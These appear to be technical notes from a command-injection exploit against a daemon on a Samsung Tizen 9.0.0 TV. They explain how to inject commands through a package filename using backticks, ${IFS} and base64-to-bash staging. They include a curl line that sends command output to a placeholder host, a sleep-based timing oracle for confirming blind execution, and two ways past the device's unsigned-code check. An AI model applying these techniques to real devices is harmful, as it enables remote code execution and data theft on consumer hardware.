Notes
-----
* Backticks perform command substitution in the package filename.
* ${IFS} supplies spaces (literal spaces are filtered).
* The base64+`base64 -d|bash` stage avoids quoting/parser problems.
* `/bin/mkdir /tmp/s-<token>` makes execution idempotent and observable.
* Max argument length is ~510 bytes; longer commands are staged as files and
  fetched with `cat <file> | bash`.
* Longer commands are fetched this way:

    cat <file> | /bin/bash 2>&1 | curl -s -m 15 --data-binary @- http://<HOST>:<PORT>/<tag>

Timing oracle
-------------
The daemon replies "closed" regardless, so execution is confirmed by timing:

    control : /bin/true      (fast)
    delayed : /bin/sleep 2   (>= 1.5 s slower)

Observed delta ~2.21 s on QA55QEF1AULXL (Tizen 9.0.0).

UEP note
--------
Unsigned native files cannot be exec'd:
    [uep][bash] the file is NOT signed!! : <path>
Piping to the interpreter on stdin (cat file | bash) is NOT subject to that check.
Managed code launched via the signed /usr/bin/dotnet is also not subject to it.
